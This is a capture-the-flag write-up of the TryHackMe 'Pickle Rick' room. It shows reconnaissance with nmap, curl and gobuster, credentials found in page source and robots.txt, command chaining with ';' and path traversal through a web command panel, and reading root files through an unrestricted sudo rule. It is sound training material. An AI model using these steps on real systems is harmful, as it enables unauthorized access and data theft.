---
title: TryHackMe - Pickle Rick - WRITE-UP
date: 2021-02-06 08:46:00 +0100
categories: [TryHackMe, Linux]
tags: [lfi, web, linux, easy]
lang: en
--- 
## BOX NAME: [Pickle Rick](https://tryhackme.com/room/picklerick)
### NMAP
``` $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.73.110 ```
``` bash 
$ @
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 09:19 UTC
Nmap scan report for 10.10.73.110
Host is up (0.041s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:23:6f:63:2c:c4:4f:55:9b:19:2a:73:b6:09:4e:59 (RSA)
|   256 76:16:40:f2:8f:4c:72:a7:44:85:e4:48:8a:59:ba:47 (ECDSA)
|_  256 92:8a:da:2c:f9:1d:fd:04:13:21:97:e6:a4:3a:16:ac (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.19 seconds
```
We see that the server is running http and ssh, let's see the  webpage
![Web-Page](https://i.imgur.com/cakJ03Y.png)

Okay, so these **BURRPS** are definetely not for  no reason, right? It's a clear hint to use Burp Suite and intercept the packets.

Before that, I've curl'ed the webpage (well, this is done automatically in my 'recon' script) and there's information disclosure in the code!

### CURL
``` $ curl -L -k 10.10.73.110 ```
``` bash 
$ @
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```
**Username: R1ckRul3s** This probably relates to ssh login. I'll also run gobuster:

### GOBUSTER
``` $ gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.73.110```
``` bash 
/login.php (Status: 200)
/assets (Status: 200)
/index.html (Status: 200)
/portal.php (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/denied.php (Status: 200)   
===============================================================
2021/01/24 09:25:05 Finished
===============================================================
```

The most intresting file here is login.php, but also denied.php, which probably should return 403 but it returned code 200! Let's check these:
### Getting Rick password
![login](https://i.imgur.com/KC8H5kP.png)

Okay, so this Username that was in the source code... it's probably not for ssh, but for this login shell. With the username we could start brute-forcing this login page.

*The /denied.php directory redirects us to login page. And the same does /portal.php and in assets are (probably) not important bootstap scripts, jquery and images*. Let's see then our last resort - robots.txt:

![robots.txt](https://i.imgur.com/7r0fZun.png)  
And yeah, there's a popular phrase from Rick and Morty. Maybe it's the password?
Yes, it was! After login we see this panel:

![panel](https://i.imgur.com/c2Z6F9p.png)
### Obtaining the First Ingredient
So this 'command panel' acts as a remote bash shell. When I execute ```ls -la``` in there I get listing of:

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```
proceeding with ```cat Sup3rS3cretPickl3Ingred.txt``` probably will **give us the first ingredient.**

![cat](https://i.imgur.com/csMYmDB.png)
Damn! SO HE PLANNED THIS OUT?!  

I assume there's some command filtering, that is blocking the ```cat``` command specifically, because we could execute ```ls```, right?  

There're other way to output a file, one of them is using ```less``` - Which let's us output a file and at the same time the ability to search for a string with '```/``` + string', but that's not that important in case of this command panel. But it looks like this doesn't give any results too

Okay but we saw in /assets that we could view almost all of the source files, images etc. Maybe we could do the same with Sup3rS3cretPickl3Ingred.txt?  
Let's go to the  ```http://10.10.73.110/Sup3rS3cretPickl3Ingred.txt``` (in your case ofc different IP)

![Ingredient1st](https://i.imgur.com/dre6DSj.png)
Hah, so we did it!  
### Obtaining the Second Ingredient
Okay so if we could do this with Sup3rS3cretPickl3Ingred.txt let's do t he same for clue.txt
![clue](https://i.imgur.com/jIXDnKy.png)

Okay, so this hint relates to LFI vulnerability (Local File Inclusion), which gives us the ability to view directories (not only those that the web-server needs, but the Local ones too!).  
But this Panel let's us perform this attack much easier, and we'll have definitely more flexibility.
We can execute ```cd ../../ ;pwd``` 
> 1. Tweaking with the number of ```../```, which basically means 'go to parent directory'  
> 1. Then we're executing ```pwd``` which let's us check in what directory we're in  
> 1. The ```;``` sign let's us specify another command that we want to execute

Executing ```cd ../../../home ;pwd``` gives us the output ```home``` so We're in /home directory, let's do ```cd ../../../home ;ls -la```

```
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Jan 24 08:08 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu
```
This gives us one conclusion - There're two users in this system, ```ubuntu``` and ```rick```. Why ubuntu though?

Checking the rick home directory we'll see the ```second ingredient``` directory.

```cd ../../../home/rick/second\ ingredients ; ls -la```.  
This results in an error with ```cd ../../../home/rick/second\ ingredients ``` command and executes ```ls -la``` command without the proper execution of the previous command, which results in executin ```ls -la``` in the web-server directory - the one that we were in, in the first place!  

Because guess what... It's not a directory, it's a txt file!  
Executing ```less ../../../home/rick/second\ ingredients``` **gives us the second ingredient!**
> The " \ " sign is used there to escape the ```space``` character, we could also give the path in quotes e.g ```less "../../../home/rick/second ingredients"``` and it would also work. 

### Obtaining the Third Ingredient

#### Checking the ubuntu user:


So now the third ingredient... I think it's going to be in either /root directory or in /ubuntu directory! Unfortunately we can't check the root files because *we're not root!*. So the ubuntu is the only option.  

We're executing ```cd ../../../home/ubuntu/ ; ls -la``` and results are:

```
drwxr-xr-x 4 ubuntu ubuntu 4096 Feb 10  2019 .
drwxr-xr-x 4 root   root   4096 Feb 10  2019 ..
-rw------- 1 ubuntu ubuntu  320 Feb 10  2019 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .cache
-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Feb 10  2019 .sudo_as_admin_successful
-rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 .viminfo
```
Okay, now the important part in this is looking through the permissions... The ```r, w, x``` keywords. You can read about it [HERE](https://www.linux.com/training-tutorials/understanding-linux-file-permissions/).  
But I'll just say, that if in the 8th column there's no ```'r'``` sign, then that means we can't view it. So we can only view these files:

```
.bash_logout
.bashrc
.profile
.sudo_as_admin_successful
```
The one that is not added by default is ```.sudo_as_admin_successful```, let's check it!  
#### Realising that ubuntu user is meaningless... xD:
... I've checked all of these files, but it looks like most of them are empty or not important... So we have to get access to /root directory... The privilege escalation might be difficult to pull off...  
But wait..., when I'm executing ```sudo -l```...
> This command lists the privileges we have as the current user

We see that we have 
```
User www-data may run the following commands on ip-10-10-73-110.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
NOPASSWD policy for the www-data (our user!). Now the only thing left then is to cat the /root/{flag_or_something.txt}  

Executing ```sudo ls /root ```:
```
3rd.txt
snap
```
And then ```sudo less /root/3rd.txt```  
**Gives us the final ingredient!**  

There was a struggle there I must admit, which ironically is the lack of privilege escalation, but overall it was a fun box!  
And in the end... we didn't had to user Burp Suite, but probably it would also come handy, though I'm not comfortable with LFI in Burp to be hones ;P